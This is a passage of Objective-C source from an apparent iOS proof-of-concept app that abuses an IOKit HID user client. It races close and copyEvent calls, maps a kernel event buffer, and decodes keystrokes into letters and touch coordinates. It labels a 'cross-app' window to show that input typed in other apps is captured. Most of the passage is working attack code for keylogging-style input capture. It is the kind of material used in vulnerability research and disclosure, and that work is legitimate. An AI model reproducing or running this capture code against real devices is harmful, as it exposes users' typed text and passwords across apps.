                     [self hexPreview:(const uint8_t *)blob.bytes length:previewLen]]];

    // Close and release
    if (kr == KERN_SUCCESS) {
        uint64_t closeScalar2 = 0;
        sIOConnectCallMethod(connection, kSelectorClose, &closeScalar2, 1, NULL, 0, NULL, NULL, NULL, NULL);
    }
}

#pragma mark - Phase 2: Concurrency Stress Test (Close/CopyEvent Synchronization)

/// Returns YES if workers drained cleanly, NO if timed out (connection may be in inconsistent state).
- (BOOL)runConcurrencyStressTest:(io_connect_t)connection {
    [self appendLog:@"\n====== Phase 2: Close/CopyEvent Synchronization Test ======"];

    static const int kStressCycles = 100;
    __block atomic_int readerRunning = 1;
    __block atomic_int unexpectedErrors = 0;
    __block atomic_int stateConfusions = 0;
    __block _Atomic kern_return_t lastReaderKr = KERN_SUCCESS;

    dispatch_queue_t readerQueue = dispatch_queue_create("com.testpoc.sync.reader", DISPATCH_QUEUE_SERIAL);
    dispatch_queue_t closerQueue = dispatch_queue_create("com.testpoc.sync.closer", DISPATCH_QUEUE_SERIAL);
    dispatch_group_t group = dispatch_group_create();

    // Reader thread: rapidly call copyEvent
    dispatch_group_enter(group);
    dispatch_async(readerQueue, ^{
        uint32_t readCount = 0;
        uint32_t errorTransitions = 0;
        kern_return_t prevKr = KERN_SUCCESS;

        while (atomic_load(&readerRunning) == 1 || readCount < 100) {
            if (atomic_load(&readerRunning) == 0 && readCount >= 100) break;

            uint64_t scalarsIn[2] = { 0, 1 };
            uint8_t structOut[256];
            size_t structOutSize = sizeof(structOut);

            kern_return_t kr = sIOConnectCallMethod(
                connection, kSelectorCopyEvent,
                scalarsIn, 2, NULL, 0,
                NULL, NULL, structOut, &structOutSize
            );

            if (kr != prevKr) {
                errorTransitions++;
                // Check for state confusion signals
                if (kr != KERN_SUCCESS
                    && kr != (kern_return_t)0xE00002CD   // kIOReturnNotReady
                    && kr != (kern_return_t)0xE00002BC   // kIOReturnBadArgument
                    && kr != (kern_return_t)0xE00002BE)  // kIOReturnNotOpen
                {
                    atomic_fetch_add(&unexpectedErrors, 1);
                    [self appendLog:[NSString stringWithFormat:
                        @"  SYNC NOTE: unexpected copyEvent error 0x%x (%s) after %u reads",
                        kr, mach_error_string(kr), readCount]];
                }
                if (kr == (kern_return_t)0xE00002C2) { // kIOReturnExclusiveAccess
                    atomic_fetch_add(&stateConfusions, 1);
                    [self appendLog:@"  SYNC NOTE: kIOReturnExclusiveAccess — unexpected state transition."];
                }
                prevKr = kr;
            }
            atomic_store(&lastReaderKr, kr);
            readCount++;
        }

        [self appendLog:[NSString stringWithFormat:
            @"  Reader done: %u reads, %u error transitions, last kr=0x%x",
            readCount, errorTransitions, atomic_load(&lastReaderKr)]];
        dispatch_group_leave(group);
    });

    // Closer thread: close/reopen cycles
    dispatch_group_enter(group);
    dispatch_async(closerQueue, ^{
        for (int cycle = 0; cycle < kStressCycles; cycle++) {
            // Close
            uint64_t closeScalar = 0;
            kern_return_t closeKr = sIOConnectCallMethod(
                connection, kSelectorClose,
                &closeScalar, 1, NULL, 0,
                NULL, NULL, NULL, NULL
            );

            // Immediately re-open with valid keys
            uint64_t openScalar = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t openKr = sIOConnectCallMethod(
                connection, kSelectorOpen,
                &openScalar, 1,
                xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL
            );

            if (cycle % 25 == 0) {
                [self appendLog:[NSString stringWithFormat:
                    @"  Cycle %d/%d: close=0x%x reopen=0x%x",
                    cycle, kStressCycles, closeKr, openKr]];
            }
        }

        // Signal reader to stop
        atomic_store(&readerRunning, 0);
        [self appendLog:@"  Closer done, signaled reader to stop."];
        dispatch_group_leave(group);
    });

    // Wait for both threads (with timeout)
    BOOL workersDrained = YES;
    dispatch_time_t timeout = dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC);
    long result = dispatch_group_wait(group, timeout);
    if (result != 0) {
        // Signal reader to stop, then give workers a grace period to drain
        atomic_store(&readerRunning, 0);
        [self appendLog:@"  WARNING: Concurrency test timed out after 30s, draining workers..."];
        dispatch_time_t drainTimeout = dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC);
        long drainResult = dispatch_group_wait(group, drainTimeout);
        if (drainResult != 0) {
            [self appendLog:@"  WARNING: Workers did not drain within 5s grace period."];
            workersDrained = NO;
        }
    }

    [self appendLog:[NSString stringWithFormat:
        @"Concurrency results: unexpectedErrors=%d stateTransitions=%d",
        unexpectedErrors, stateConfusions]];

    if (unexpectedErrors > 0 || stateConfusions > 0) {
        [self appendLog:@"  NOTE: Concurrent operations produced anomalous error codes — synchronization gap noted."];
    } else {
        [self appendLog:@"  No concurrency anomalies detected in this run."];
    }

    [self appendLog:@"====== Phase 2 Complete ======"];
    return workersDrained;
}

#pragma mark - Phase 3: Event Visibility Probe

- (BOOL)isZeroFilled:(const uint8_t *)bytes length:(size_t)length {
    if (!bytes) return NO;
    for (size_t i = 0; i < length; i++) {
        if (bytes[i] != 0) return NO;
    }
    return YES;
}

// Collection payload layouts vary by provider/device.
// Instead of fixed header offsets, scan for a fully-consistent child chain.
- (BOOL)findCollectionChildChainStart:(const uint8_t *)base
                            totalSize:(size_t)totalSize
                             outStart:(size_t *)outStart
                        outChildCount:(int *)outChildCount
                          outCoverage:(size_t *)outCoverage {
    if (outStart) *outStart = 0;
    if (outChildCount) *outChildCount = 0;
    if (outCoverage) *outCoverage = 0;
    if (!base || totalSize < 32) return NO;

    const int kMaxChildren = 64;
    size_t bestStart = 0;
    size_t bestCoverage = 0;
    int bestCount = 0;

    for (size_t cand = 16; cand + 16 <= totalSize; cand += 4) {
        size_t off = cand;
        int count = 0;
        BOOL valid = YES;

        while (off + 16 <= totalSize && count < kMaxChildren) {
            uint32_t childSize = 0;
            memcpy(&childSize, base + off, sizeof(childSize));

            if (childSize < 16
                || (size_t)childSize > (totalSize - off)
                || (childSize & 0x3) != 0) {
                valid = NO;
                break;
            }

            // Keep scanner conservative: low-byte type should be in expected range.
            uint32_t typeField = 0;
            memcpy(&typeField, base + off + 12, sizeof(typeField));
            uint32_t childType = typeField & 0xFF;
            if (childType > 0x7F) {
                valid = NO;
                break;
            }

            count++;
            off += childSize;

            if (off == totalSize) break;

            // Allow tiny trailing zero padding after a complete chain.
            if ((totalSize - off) < 16) {
                if ([self isZeroFilled:base + off length:(totalSize - off)]) {
                    off = totalSize;
                } else {
                    valid = NO;
                }
                break;
            }
        }

        if (count >= kMaxChildren && off < totalSize) {
            valid = NO;
        }
        if (!valid || count == 0 || off <= cand) {
            continue;
        }

        size_t coverage = off - cand;
        if (count > bestCount || (count == bestCount && coverage > bestCoverage)) {
            bestCount = count;
            bestStart = cand;
            bestCoverage = coverage;
        }
    }

    if (bestCount == 0) return NO;
    if (outStart) *outStart = bestStart;
    if (outChildCount) *outChildCount = bestCount;
    if (outCoverage) *outCoverage = bestCoverage;
    return YES;
}

// Heuristic decoder for the SPU Collection frame observed on AppleSPUHIDDriver:
// size=0x5a, header fields fixed, payload tail carries changing signed fields.
- (BOOL)parseSPUCollectionFrame:(const uint8_t *)eventBytes
                      eventSize:(size_t)eventSize
                     outSummary:(NSString **)outSummary {
    if (outSummary) *outSummary = nil;
    if (!eventBytes || eventSize < 0x5A) return NO;

    uint32_t d28 = 0, d32 = 0, d36 = 0, d48 = 0, d56 = 0, d60 = 0;
    memcpy(&d28, eventBytes + 28, 4);
    memcpy(&d32, eventBytes + 32, 4);
    memcpy(&d36, eventBytes + 36, 4);
    memcpy(&d48, eventBytes + 48, 4);
    memcpy(&d56, eventBytes + 56, 4);
    memcpy(&d60, eventBytes + 60, 4);

    // Signature taken from repeated on-device frames in output.txt
    if (!(d28 == 1 && d32 == 0x3E && d36 == 1 && d56 == 0x22 && d60 == 0xD3)) {
        return NO;
    }

    uint64_t q64 = 0;
    uint32_t seq = 0;
    int32_t v1 = 0, v2 = 0, v3 = 0;
    memcpy(&q64, eventBytes + 64, 8);
    memcpy(&seq, eventBytes + 72, 4);
    memcpy(&v1, eventBytes + 76, 4);
    memcpy(&v2, eventBytes + 80, 4);
    memcpy(&v3, eventBytes + 84, 4);

    int16_t v3lo = (int16_t)(v3 & 0xFFFF);
    int16_t v3hi = (int16_t)((uint32_t)v3 >> 16);
    NSString *summary = [NSString stringWithFormat:
                         @"SPU frame(sig=0x%x/0x%x flags=0x%x) seq=%u vec=(%d,%d,%d) v3_parts=(%d,%d) q64=0x%llx",
                         d56, d60, d48, seq, v1, v2, v3, v3lo, v3hi, (unsigned long long)q64];
    if (outSummary) *outSummary = summary;
    return YES;
}

- (void)runEventCapture:(io_connect_t)connection
             mappedAddr:(mach_vm_address_t)mappedAddr
             mappedSize:(mach_vm_size_t)mappedSize {
    [self appendLog:@"\n====== Phase 3: Event Visibility Probe ======"];
    [self appendLog:@"Touch the screen or type to generate events..."];
    [self appendLog:@"Capturing for ~10 seconds (200 polls at 50ms)..."];

    static const int kCapturePollCount = 200;
    static const useconds_t kPollIntervalUs = 50000; // 50ms
    static const int kProofMarkerSplitPoll = kCapturePollCount / 2;

    int eventCount = 0;
    // Full-event dedup: normalize timestamp (+4..+11) before comparing.
    uint8_t prevStable[kMappedProbeMaxBytes];
    memset(prevStable, 0, sizeof(prevStable));
    size_t prevStableLen = 0;
    BOOL havePrev = NO;

    // Correlation counters for child event types.
    int childDigitizerCount = 0; // type 11 — touch events
    int childKeyboardCount  = 0; // type 4  — keyboard events
    int childButtonCount    = 0; // type 3  — button events
    int childPointerCount   = 0; // type 5  — pointer/translation
    int childScrollCount    = 0; // type 7  — scroll events
    int childSensorCount    = 0; // types 27-29 — accelerometer/gyro/compass
    int childOtherCount     = 0; // anything else
    int totalChildCount     = 0;
    int spuFrameCount       = 0; // fallback decode for AppleSPUHIDDriver collection frames

    // Proof-marker split: first half = local-control window, second half = cross-app challenge window.
    int markerADigitizerCount = 0, markerAKeyboardCount = 0, markerAButtonCount = 0;
    int markerAPointerCount = 0, markerAScrollCount = 0, markerASensorCount = 0, markerAOtherCount = 0;
    int markerBDigitizerCount = 0, markerBKeyboardCount = 0, markerBButtonCount = 0;
    int markerBPointerCount = 0, markerBScrollCount = 0, markerBSensorCount = 0, markerBOtherCount = 0;
    int markerASPUCount = 0, markerBSPUCount = 0;

    NSTimeInterval markerAUnix = [[NSDate date] timeIntervalSince1970];
    NSTimeInterval markerBUnix = 0;
    [self appendLog:[NSString stringWithFormat:
                     @"[PROOF] Marker A start @ %.3f: LOCAL control window (use TestPOC only). Expected child types: Digitizer(11), Keyboard(4).",
                     markerAUnix]];
    [self appendLog:[NSString stringWithFormat:
                     @"[PROOF] Marker B starts at poll %d: switch to DIFFERENT app and interact; expected leakage types remain Digitizer(11)/Keyboard(4).",
                     kProofMarkerSplitPoll]];

    for (int i = 0; i < kCapturePollCount; i++) {
        if (i == kProofMarkerSplitPoll) {
            markerBUnix = [[NSDate date] timeIntervalSince1970];
            [self appendLog:[NSString stringWithFormat:
                             @"[PROOF] Marker B start @ %.3f: cross-app challenge window active.",
                             markerBUnix]];
        }

        // Trigger kernel buffer update via copyEvent
        uint64_t scalarsIn[2] = { 0, 1 };
        uint8_t structOut[kEventOutputBufferSize];
        size_t structOutSize = sizeof(structOut);
        kern_return_t kr = sIOConnectCallMethod(
            connection, kSelectorCopyEvent,
            scalarsIn, 2, NULL, 0,
            NULL, NULL, structOut, &structOutSize
        );

        if (mappedAddr == 0 || mappedSize == 0) {
            usleep(kPollIntervalUs);
            continue;
        }

        // Fix #2: Only process mapped data when copyEvent succeeded or
        // returned a non-fatal code that still updates the buffer.
        if (kr != KERN_SUCCESS && kr != (kern_return_t)0xE00002CD /* kIOReturnNotReady */) {
            usleep(kPollIntervalUs);
            continue;
        }

        const uint8_t *mapped = (const uint8_t *)(uintptr_t)mappedAddr;
        size_t safeLen = MIN((size_t)mappedSize, kMappedProbeMax);

        // Fix #1: Consistent offset model.
        // The mapped buffer layout (matching eventHeaderSummary):
        //   +0:  uint32 eventSize   (d0)
        //   +4:  uint64 timestamp   (q4 / ts@+4)
        //   +12: uint32 typeField   (d3)
        //   +16+: type-specific payload
        // All offsets below are relative to mapped base (not mapped+4).
        uint32_t eventSize = 0;
        if (safeLen >= 4) {
            memcpy(&eventSize, mapped, sizeof(eventSize));
        }

        if (eventSize == 0 || eventSize > safeLen) {
            usleep(kPollIntervalUs);
            continue;
        }

        // Full-event dedup with timestamp normalization.
        uint8_t curStable[kMappedProbeMaxBytes];
        memcpy(curStable, mapped, (size_t)eventSize);
        if (eventSize > 4) {
            size_t tsEnd = MIN((size_t)12, (size_t)eventSize);
            memset(curStable + 4, 0, tsEnd - 4); // zero timestamp bytes
        }
        BOOL isNew = (!havePrev
                      || prevStableLen != (size_t)eventSize
                      || memcmp(prevStable, curStable, (size_t)eventSize) != 0);

        if (isNew && eventSize >= 16) {
            eventCount++;
            memcpy(prevStable, curStable, (size_t)eventSize);
            prevStableLen = (size_t)eventSize;
            havePrev = YES;

            // Parse IOHIDEvent header — offsets from mapped base:
            //   +0:  eventSize (uint32)
            //   +4:  timestamp (uint64)
            //   +12: typeField (uint32)
            //   +16+: type-specific fields
            uint64_t timestamp = 0;
            if (eventSize >= 12) {
                memcpy(&timestamp, mapped + 4, sizeof(timestamp));
            }

            uint32_t typeField = 0;
            if (eventSize >= 16) {
                memcpy(&typeField, mapped + 12, sizeof(typeField));
            }

            uint32_t eventType = typeField & 0xFF;
            NSString *typeName = [self hidEventTypeName:eventType];

            NSMutableString *detail = [NSMutableString string];

            // Collection events (type 0) wrap child events.
            // Scan the payload for a fully-consistent child chain.
            if (eventType == 0 && eventSize > 16) {
                size_t childStart = 0;
                size_t childCoverage = 0;
                int expectedChildren = 0;
                int childrenFound = 0;
                BOOL foundChain = [self findCollectionChildChainStart:mapped
                                                             totalSize:eventSize
                                                              outStart:&childStart
                                                         outChildCount:&expectedChildren
                                                           outCoverage:&childCoverage];
                if (foundChain) {
                    size_t childOff = childStart;
                    size_t chainEnd = childStart + childCoverage;
                    int maxChildren = 32; // safety cap
                    while (childOff + 16 <= chainEnd && childrenFound < maxChildren) {
                        size_t childAt = childOff;
                        uint32_t peekType = 0;
                        memcpy(&peekType, mapped + childAt + 12, 4);
                        peekType &= 0xFF;

                        NSString *childDesc = [self parseChildEvent:mapped
                                                             offset:&childOff
                                                          totalSize:chainEnd];
                        if (!childDesc || childOff <= childAt) break;

                        childrenFound++;
                        totalChildCount++;
                        BOOL inMarkerB = (i >= kProofMarkerSplitPoll);

                        // Tally by child type for global and marker-window summaries.
                        switch (peekType) {
                            case 11:
                                childDigitizerCount++;
                                inMarkerB ? markerBDigitizerCount++ : markerADigitizerCount++;
                                break;
                            case 4:
                                childKeyboardCount++;
                                inMarkerB ? markerBKeyboardCount++ : markerAKeyboardCount++;
                                break;
                            case 3:
                                childButtonCount++;
                                inMarkerB ? markerBButtonCount++ : markerAButtonCount++;
                                break;
                            case 5:
                                childPointerCount++;
                                inMarkerB ? markerBPointerCount++ : markerAPointerCount++;
                                break;
                            case 7:
                                childScrollCount++;
                                inMarkerB ? markerBScrollCount++ : markerAScrollCount++;
                                break;
                            case 27: case 28: case 29:
                                childSensorCount++;
                                inMarkerB ? markerBSensorCount++ : markerASensorCount++;
                                break;
                            default:
                                childOtherCount++;
                                inMarkerB ? markerBOtherCount++ : markerAOtherCount++;
                                break;
                        }
                        [detail appendFormat:@"\n  child[%d @+0x%zx]: %@", childrenFound, childAt, childDesc];
                    }
                }

                if (childrenFound > 0) {
                    [detail insertString:[NSString stringWithFormat:
                                          @"%d/%d children (chainStart=0x%zx chainBytes=0x%zx):",
                                          childrenFound, expectedChildren, childStart, childCoverage]
                                 atIndex:0];
                } else {
                    NSString *spuSummary = nil;
                    if ([self parseSPUCollectionFrame:mapped eventSize:eventSize outSummary:&spuSummary]) {
                        spuFrameCount++;
                        if (i >= kProofMarkerSplitPoll) markerBSPUCount++;
                        else markerASPUCount++;
                        [detail appendFormat:@"(no child chain; %@)", spuSummary];
                    } else {
                        [detail appendFormat:@"(no validated child chain, payload %zu bytes)", (size_t)(eventSize - 16)];
                    }
                }
            } else if (eventType == 4 && eventSize >= 28) {
                // Keyboard event: +16 usagePage, +20 usage, +24 value
                uint32_t usagePage = 0, usage = 0, value = 0;
                memcpy(&usagePage, mapped + 16, 4);
                memcpy(&usage, mapped + 20, 4);
                memcpy(&value, mapped + 24, 4);
                [detail appendFormat:@"usagePage=0x%02x usage=0x%02x(%@) value=%u(%@)",
                    usagePage, usage,
                    [self hidUsageName:usage page:usagePage],
                    value, value ? @"down" : @"up"];
            } else if (eventType == 11 && eventSize >= 32) {
                // Digitizer/Touch: +16 x(float), +20 y(float), +28 phase
                float x = 0, y = 0;
                uint32_t phase = 0;
                memcpy(&x, mapped + 16, 4);
                memcpy(&y, mapped + 20, 4);
                memcpy(&phase, mapped + 28, 4);
                NSString *phaseName = @"unknown";
                switch (phase) {
                    case 0: phaseName = @"none"; break;
                    case 1: phaseName = @"began"; break;
                    case 2: phaseName = @"moved"; break;
                    case 3: phaseName = @"stationary"; break;
                    case 4: phaseName = @"ended"; break;
                    case 5: phaseName = @"cancelled"; break;
                }
                [detail appendFormat:@"x=%.1f y=%.1f phase=%@(%u)", x, y, phaseName, phase];
            } else if (eventType == 5 && eventSize >= 24) {
                // Pointer/Translation: +16 dx, +20 dy
                float dx = 0, dy = 0;
                memcpy(&dx, mapped + 16, 4);
                memcpy(&dy, mapped + 20, 4);
                [detail appendFormat:@"dx=%.1f dy=%.1f", dx, dy];
            } else if (eventType == 7 && eventSize >= 24) {
                // Scroll (type 7): +16 scrollX, +20 scrollY
                float sx = 0, sy = 0;
                memcpy(&sx, mapped + 16, 4);
                memcpy(&sy, mapped + 20, 4);
                [detail appendFormat:@"scrollX=%.1f scrollY=%.1f", sx, sy];
            } else if (eventType == 3 && eventSize >= 24) {
                // Button: +16 mask, +20 pressure
                uint32_t buttonMask = 0, pressure = 0;
                memcpy(&buttonMask, mapped + 16, 4);
                memcpy(&pressure, mapped + 20, 4);
                [detail appendFormat:@"mask=0x%x pressure=%u", buttonMask, pressure];
            }

            [self appendLog:[NSString stringWithFormat:
                @"EVENT [%d]: type=%@(%u) %@ ts=0x%llx copyKr=0x%x",
                eventCount, typeName, eventType,
                detail.length > 0 ? detail : @"",
                (unsigned long long)timestamp, kr]];

            // Log raw hex for first 64 bytes from base
            size_t hexLen = MIN((size_t)64, (size_t)eventSize);
            [self appendLog:[NSString stringWithFormat:@"  raw: %@",
                             [self hexPreview:mapped length:hexLen]]];

            // For collections with children, also log raw hex at child offsets
            // to aid manual correlation
            if (eventType == 0 && eventSize > 64) {
                size_t extLen = MIN((size_t)128, (size_t)eventSize) - 64;
                if (extLen > 0) {
                    [self appendLog:[NSString stringWithFormat:@"  raw+64: %@",
                                     [self hexPreview:mapped + 64 length:extLen]]];
                }
            }
        }

        usleep(kPollIntervalUs);
    }

    // ---- Summary & Correlation ----
    int totalStructuredDecoded = totalChildCount + spuFrameCount;
    [self appendLog:[NSString stringWithFormat:
                     @"\nCaptured %d unique events (%d child events parsed, %d SPU frames decoded).",
                     eventCount, totalChildCount, spuFrameCount]];
    [self appendLog:[NSString stringWithFormat:
                     @"[PROOF] Marker timestamps: A=%.3f B=%@",
                     markerAUnix,
                     markerBUnix > 0 ? [NSString stringWithFormat:@"%.3f", markerBUnix] : @"<not reached>"]];

    if (totalStructuredDecoded > 0) {
        [self appendLog:@"--- Decoded Event Correlation ---"];
        if (childDigitizerCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Digitizer(11): %d — correlates with TOUCH input (tap/swipe in any app)",
                childDigitizerCount]];
        if (childKeyboardCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Keyboard(4):   %d — correlates with KEY input (typing in any app)",
                childKeyboardCount]];
        if (childButtonCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Button(3):     %d — correlates with hardware BUTTON presses",
                childButtonCount]];
        if (childPointerCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Pointer(5):    %d — correlates with cursor/trackpad movement",
                childPointerCount]];
        if (childScrollCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Scroll(7):     %d — correlates with SCROLL gestures",
                childScrollCount]];
        if (childSensorCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Sensor(27-29): %d — correlates with device MOTION (accel/gyro/compass)",
                childSensorCount]];
        if (childOtherCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Other:         %d — uncategorized child types",
                childOtherCount]];
        if (spuFrameCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  SPU(raw):      %d — AppleSPUHIDDriver fallback frame decode (non-sensitive by itself)",
                spuFrameCount]];

        [self appendLog:@"--- Proof Marker Correlation ---"];
        [self appendLog:[NSString stringWithFormat:
                         @"  Marker A (local-control): Digitizer=%d Keyboard=%d Button=%d Pointer=%d Scroll=%d Sensor=%d Other=%d SPU=%d",
                         markerADigitizerCount, markerAKeyboardCount, markerAButtonCount,
                         markerAPointerCount, markerAScrollCount, markerASensorCount, markerAOtherCount, markerASPUCount]];
        [self appendLog:[NSString stringWithFormat:
                         @"  Marker B (cross-app challenge): Digitizer=%d Keyboard=%d Button=%d Pointer=%d Scroll=%d Sensor=%d Other=%d SPU=%d",
                         markerBDigitizerCount, markerBKeyboardCount, markerBButtonCount,
                         markerBPointerCount, markerBScrollCount, markerBSensorCount, markerBOtherCount, markerBSPUCount]];

        BOOL markerBSensitive = (markerBDigitizerCount > 0 || markerBKeyboardCount > 0);
        if (markerBSensitive) {
            [self appendLog:@"[PROOF] Marker-B observed Digitizer/Keyboard children."];
            [self appendLog:@"[PROOF] Treat this as cross-app evidence ONLY if Marker-B time aligns"];
            [self appendLog:@"        with recorded interaction in a different foreground app."];
        } else {
            [self appendLog:@"[PROOF] Marker-B window showed no Digitizer/Keyboard children in this run."];
        }
        [self appendLog:[NSString stringWithFormat:
                         @"[ASSERT] Marker-B sensitive-input assertion (Digitizer/Keyboard > 0): %@",
                         markerBSensitive ? @"PASS" : @"FAIL"]];
        if (!markerBSensitive) {
            if (markerBSPUCount > 0) {
                [self appendLog:@"[ASSERT] Marker-B had only SPU/raw frames; no sensitive touch/keyboard decode."];
            } else {
                [self appendLog:@"[ASSERT] Marker-B had no sensitive decode signals."];
            }
        }
    } else if (eventCount > 0) {
        [self appendLog:@"Collection events seen but no children decoded."];
        [self appendLog:@"No fully-consistent child chain was found by the payload scanner."];
        [self appendLog:@"Review raw hex above for alternate collection layouts or pointer-based children."];
        [self appendLog:@"[ASSERT] Marker-B sensitive-input assertion (Digitizer/Keyboard > 0): FAIL"];
        [self appendLog:@"[ASSERT] No structured decode available in Marker-B window."];
    } else {
        [self appendLog:@"No events observed. Try touching/typing during capture window."];
        [self appendLog:@"[ASSERT] Marker-B sensitive-input assertion (Digitizer/Keyboard > 0): FAIL"];
    }

    [self appendLog:@"====== Phase 3 Complete ======"];
}

// Parse a single child event starting at `base + offset` within `totalSize` bytes.
// Returns a human-readable description and advances *offset past the child.
- (NSString *)parseChildEvent:(const uint8_t *)base
                       offset:(size_t *)offset
                    totalSize:(size_t)totalSize {
    size_t off = *offset;

    // Each child event has the same header layout:
    //   +0: uint32 childSize
    //   +4: uint64 timestamp
    //   +12: uint32 typeField
    //   +16+: type-specific payload
    if (off + 16 > totalSize) {
        *offset = totalSize; // stop scanning
        return nil;
    }

    uint32_t childSize = 0;
    memcpy(&childSize, base + off, 4);
    if (childSize < 16 || off + childSize > totalSize) {
        *offset = totalSize;
        return nil;
    }

    uint64_t childTs = 0;
    memcpy(&childTs, base + off + 4, 8);

    uint32_t childTypeField = 0;
    memcpy(&childTypeField, base + off + 12, 4);
    uint32_t childType = childTypeField & 0xFF;

    NSString *childTypeName = [self hidEventTypeName:childType];
    NSMutableString *desc = [NSMutableString stringWithFormat:@"%@(%u)", childTypeName, childType];

    const uint8_t *child = base + off;

    if (childType == 4 && childSize >= 28) {
        // Keyboard: +16 usagePage, +20 usage, +24 value
        uint32_t usagePage = 0, usage = 0, value = 0;
        memcpy(&usagePage, child + 16, 4);
        memcpy(&usage, child + 20, 4);
        memcpy(&value, child + 24, 4);
        [desc appendFormat:@" usagePage=0x%02x usage=0x%02x(%@) %@",
            usagePage, usage,
            [self hidUsageName:usage page:usagePage],
            value ? @"DOWN" : @"UP"];
    } else if (childType == 11 && childSize >= 32) {
        // Digitizer/Touch: +16 x(float), +20 y(float), +28 phase
        float x = 0, y = 0;
        uint32_t phase = 0;
        memcpy(&x, child + 16, 4);
        memcpy(&y, child + 20, 4);
        if (childSize >= 32) memcpy(&phase, child + 28, 4);
        NSString *phaseName = @"?";
        switch (phase) {
            case 0: phaseName = @"none"; break;
            case 1: phaseName = @"began"; break;
            case 2: phaseName = @"moved"; break;
            case 3: phaseName = @"stationary"; break;
            case 4: phaseName = @"ended"; break;
            case 5: phaseName = @"cancelled"; break;
        }
        [desc appendFormat:@" x=%.1f y=%.1f phase=%@", x, y, phaseName];
    } else if (childType == 5 && childSize >= 24) {
        // Translation/Pointer: +16 dx, +20 dy
        float dx = 0, dy = 0;
        memcpy(&dx, child + 16, 4);
        memcpy(&dy, child + 20, 4);
        [desc appendFormat:@" dx=%.1f dy=%.1f", dx, dy];
    } else if (childType == 7 && childSize >= 24) {
        // Scroll: +16 scrollX, +20 scrollY
        float sx = 0, sy = 0;
        memcpy(&sx, child + 16, 4);
        memcpy(&sy, child + 20, 4);
        [desc appendFormat:@" scrollX=%.1f scrollY=%.1f", sx, sy];
    } else if (childType == 3 && childSize >= 24) {
        // Button: +16 mask, +20 pressure
        uint32_t mask = 0, pressure = 0;
        memcpy(&mask, child + 16, 4);
        memcpy(&pressure, child + 20, 4);
        [desc appendFormat:@" mask=0x%x pressure=%u", mask, pressure];
    } else if (childType == 25 && childSize >= 20) {
        // Brightness: +16 level
        float level = 0;
        memcpy(&level, child + 16, 4);
        [desc appendFormat:@" level=%.2f", level];
    } else if ((childType == 27 || childType == 28 || childType == 29) && childSize >= 28) {
        // Accelerometer/Gyro/Compass: +16 x, +20 y, +24 z
        float x = 0, y = 0, z = 0;
        memcpy(&x, child + 16, 4);
        memcpy(&y, child + 20, 4);
        memcpy(&z, child + 24, 4);
        [desc appendFormat:@" x=%.3f y=%.3f z=%.3f", x, y, z];
    } else {
        // Generic: log first 8 payload bytes as hex
        size_t payloadLen = MIN(childSize - 16, (uint32_t)8);
        if (payloadLen > 0) {
            [desc appendFormat:@" payload=%@", [self hexPreview:child + 16 length:payloadLen]];
        }
    }

    *offset = off + childSize;
    return desc;
}

- (NSString *)hidEventTypeName:(uint32_t)type {
    switch (type) {
        case 0:  return @"Collection";
        case 1:  return @"NULL";
        case 2:  return @"VendorDefined";
        case 3:  return @"Button";
        case 4:  return @"Keyboard";
        case 5:  return @"Translation";
        case 6:  return @"Rotation";
        case 7:  return @"Scroll";
        case 8:  return @"Scale";
        case 9:  return @"Zoom";
        case 10: return @"Velocity";
        case 11: return @"Digitizer";
        case 12: return @"NavigationSwipe";
        case 13: return @"Progress";
        case 14: return @"MultiAxisPointer";
        case 25: return @"Brightness";
        case 27: return @"Accelerometer";
        case 28: return @"Gyro";
        case 29: return @"Compass";
        case 30: return @"Proximity";
        case 32: return @"AmbientLightSensor";
        case 35: return @"Power";
        case 40: return @"Biometric";
        default: return @"Unknown";
    }
}

- (NSString *)hidUsageName:(uint32_t)usage page:(uint32_t)page {
    if (page == 0x07) { // Keyboard/Keypad page
        if (usage >= 0x04 && usage <= 0x1D) {
            char letter = 'A' + (char)(usage - 0x04);
            return [NSString stringWithFormat:@"%c", letter];
        }
        switch (usage) {
            case 0x1E: return @"1"; case 0x1F: return @"2";
            case 0x20: return @"3"; case 0x21: return @"4";
            case 0x22: return @"5"; case 0x23: return @"6";
            case 0x24: return @"7"; case 0x25: return @"8";
            case 0x26: return @"9"; case 0x27: return @"0";
            case 0x28: return @"Return"; case 0x29: return @"Escape";
            case 0x2A: return @"Backspace"; case 0x2B: return @"Tab";
            case 0x2C: return @"Space";
            default: return [NSString stringWithFormat:@"0x%02x", usage];
        }
    }
    return [NSString stringWithFormat:@"0x%02x", usage];
}

#pragma mark - Phase 4: Broad Service Class Enumeration

- (NSString *)labelForService:(io_service_t)service
                     outClass:(NSString **)outClass
                      outName:(NSString **)outName
                  outEntryID:(uint64_t *)outEntryID {
    NSString *serviceClass = @"<unknown>";
    NSString *serviceName = @"<unknown>";
    uint64_t entryID = 0;

    if (sIOObjectCopyClass) {
        CFStringRef cfClass = sIOObjectCopyClass(service);
        if (cfClass) {
            serviceClass = [(__bridge NSString *)cfClass copy];
            CFRelease(cfClass);
        }
    }
    if (sIORegistryEntryGetName) {
        char nameBuf[128] = {0};
        if (sIORegistryEntryGetName(service, nameBuf) == KERN_SUCCESS && nameBuf[0]) {
            serviceName = [NSString stringWithUTF8String:nameBuf];
        }
    }
    if (sIORegistryEntryGetRegistryEntryID) {
        (void)sIORegistryEntryGetRegistryEntryID(service, &entryID);
    }

    if (outClass) *outClass = serviceClass;
    if (outName) *outName = serviceName;
    if (outEntryID) *outEntryID = entryID;

    return [NSString stringWithFormat:@"entryID=0x%llx class=%@ name=%@",
            entryID, serviceClass ?: @"<unknown>", serviceName ?: @"<unknown>"];
}

- (void)runPhase4BroadServiceEnumeration {
    [self appendLog:@"\n====== Phase 4: Broad Service Class Enumeration ======"];

    if (!sIOServiceMatching || !sIOServiceGetMatchingServices || !sIOIteratorNext || !sIOServiceOpen || !sIOServiceClose || !sIOObjectRelease) {
        [self appendLog:@"SKIP: required IOKit symbols unavailable for broad enumeration."];
        [self appendLog:@"====== Phase 4 Complete ======"];
        return;
    }

